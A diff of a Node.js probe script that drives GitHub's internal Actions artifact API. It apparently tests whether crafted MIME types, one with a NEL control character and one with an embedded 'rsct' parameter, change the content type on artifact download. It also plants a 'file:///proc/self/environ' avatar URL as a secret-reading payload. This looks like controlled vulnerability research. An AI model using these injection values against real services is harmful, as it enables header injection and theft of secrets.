@@ -3,74 +3,78 @@ import { internalArtifactTwirpClient } from './node_modules/@actions/artifact/li
 import { getBackendIdsFromToken } from './node_modules/@actions/artifact/lib/internal/shared/util.js';
 import { StringValue } from './node_modules/@actions/artifact/lib/generated/index.js';
 
-const client = internalArtifactTwirpClient();
+const client = internalArtifactTwirpClient({maxAttempts: 1});
 const backend = getBackendIdsFromToken();
-const version = Number(process.env.ARTIFACT_VERSION || '7');
-const name = `repo-cassette-qinj-v${version}-${process.env.GITHUB_RUN_ID}`;
-// A single bounded differential: valid quoted MIME parameter containing an
-// apparent rsct delimiter.  If the artifact redirect builder concatenates
-// this value instead of URL-encoding it, the second rsct becomes NEL+JSON.
-const createMimeType = 'application/json;foo="bar&rsct=%C2%85application%2Fjson"';
-const blobMimeType = 'application/json';
+const name = `repo-cassette-sequential-${process.env.GITHUB_RUN_ID}`;
 const body = Buffer.from(JSON.stringify({
   full_name: 'repo/cassette',
-  owner: { login: 'repo', avatar_url: 'file:///proc/self/environ' },
+  owner: {login: 'repo', avatar_url: 'file:///proc/self/environ'},
   description: 'controlled',
   stargazers_count: 0,
 }));
 
-const made = await client.CreateArtifact({
+const first = await client.CreateArtifact({
   ...backend,
   name,
-  version,
-  mimeType: StringValue.create({ value: createMimeType }),
+  version: 6,
+  mimeType: StringValue.create({value: '\u0085application/json'}),
 });
-if (!made.ok) throw new Error('CreateArtifact returned not ok');
-await new BlobClient(made.signedUploadUrl).getBlockBlobClient().uploadData(body, {
-  blobHTTPHeaders: { blobContentType: blobMimeType },
-});
+if (!first.ok) throw new Error('first CreateArtifact returned not ok');
+
+let second;
+let secondError = '';
+try {
+  second = await client.CreateArtifact({
+    ...backend,
+    name,
+    version: 7,
+    mimeType: StringValue.create({value: 'application/json'}),
+  });
+} catch (error) {
+  secondError = String(error?.message || error).slice(0, 240);
+}
+
+if (!second?.ok) {
+  console.log('SEQUENTIAL_RESULT', JSON.stringify({
+    firstOk: first.ok,
+    secondOk: false,
+    secondError,
+  }));
+  process.exit(0);
+}
+
+for (const signedUrl of [first.signedUploadUrl, second.signedUploadUrl]) {
+  await new BlobClient(signedUrl).getBlockBlobClient().uploadData(body, {
+    blobHTTPHeaders: {blobContentType: 'application/json'},
+  });
+}
 const finalized = await client.FinalizeArtifact({
   ...backend,
   name,
   size: String(body.length),
 });
-const artifactId = String(finalized.artifactId);
+if (!finalized.ok) throw new Error('FinalizeArtifact returned not ok');
 
 const headers = {
   Authorization: `Bearer ${process.env.GITHUB_TOKEN}`,
   Accept: 'application/vnd.github.v3+json',
-  'User-Agent': 'repo-cassette-controlled-probe',
+  'User-Agent': 'repo-cassette-sequential-probe',
 };
-const apiUrl = `https://api.github.com/repos/${process.env.GITHUB_REPOSITORY}/actions/artifacts/${artifactId}/zip`;
-const first = await fetch(apiUrl, { headers, redirect: 'manual' });
-const location = first.headers.get('location');
-const final = location ? await fetch(location) : first;
+const apiUrl = `https://api.github.com/repos/${process.env.GITHUB_REPOSITORY}/actions/artifacts/${finalized.artifactId}/zip`;
+const initial = await fetch(apiUrl, {headers, redirect: 'manual'});
+const location = initial.headers.get('location');
+const final = location ? await fetch(location) : initial;
 const finalBody = Buffer.from(await final.arrayBuffer());
 const finalType = final.headers.get('content-type') || '';
-const result = {
-  version,
-  createMimeType,
-  blobMimeTypeCodePoints: Array.from(blobMimeType, c => c.codePointAt(0)),
-  artifactId,
-  firstStatus: first.status,
-  firstType: first.headers.get('content-type'),
-  hasLocation: Boolean(location),
+console.log('SEQUENTIAL_RESULT', JSON.stringify({
+  firstOk: first.ok,
+  secondOk: second.ok,
+  sameUploadUrl: first.signedUploadUrl === second.signedUploadUrl,
+  artifactId: String(finalized.artifactId),
+  initialStatus: initial.status,
   finalStatus: final.status,
   finalType,
   finalTypeCodePoints: Array.from(finalType, c => c.codePointAt(0)),
   bodyMatches: finalBody.equals(body),
   bodyLength: finalBody.length,
-  expectedLength: body.length,
-};
-
-const target = `https://api.github.com/repos/${process.env.GITHUB_REPOSITORY}/contents/probe-result-${process.env.GITHUB_RUN_ID}.json`;
-const saved = await fetch(target, {
-  method: 'PUT',
-  headers: { ...headers, 'Content-Type': 'application/json' },
-  body: JSON.stringify({
-    message: `Record controlled artifact v${version} result`,
-    content: Buffer.from(JSON.stringify(result, null, 2) + '\n').toString('base64'),
-  }),
-});
-if (!saved.ok) throw new Error(`Saving result failed: ${saved.status}`);
-console.log('RESULT_SAVED', JSON.stringify(result));
+}));
